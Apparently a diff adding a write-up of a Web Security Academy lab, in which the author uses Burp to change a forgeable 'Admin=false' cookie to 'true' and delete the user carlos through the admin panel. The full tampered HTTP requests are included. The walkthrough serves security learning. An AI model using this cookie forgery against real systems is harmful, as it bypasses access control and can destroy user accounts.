@@ -1,1 +1,65 @@
+Lab Description: 
 
+This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.
+Solve the lab by accessing the admin panel and using it to delete the user carlos.
+You can log in to your own account using the following credentials: wiener:peter 
+
+
+Using burp, i log on the application using the credentials provided on the lab description, after this, i send a request to the following URL:
+
+https://LAB_ID.web-security-academy.net/admin
+
+This is the request on Burp:
+
+GET /admin HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID; Admin=false
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+Searching for any interesting in the http headers, i see the cookie Admin=false, before forwarding the request, i change this value from false to true:
+
+GET /admin HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID; Admin=true
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+I forward the request and the admin panel loads without problems, then i click to delete the user Carlos, but it doens´t work, because i have to change the value of the Admin cookie again when making this request, 
+like the following:
+
+GET /admin/delete?username=carlos HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID; Admin=true
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://LAB_ID.web-security-academy.net/admin
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+Lab solved.
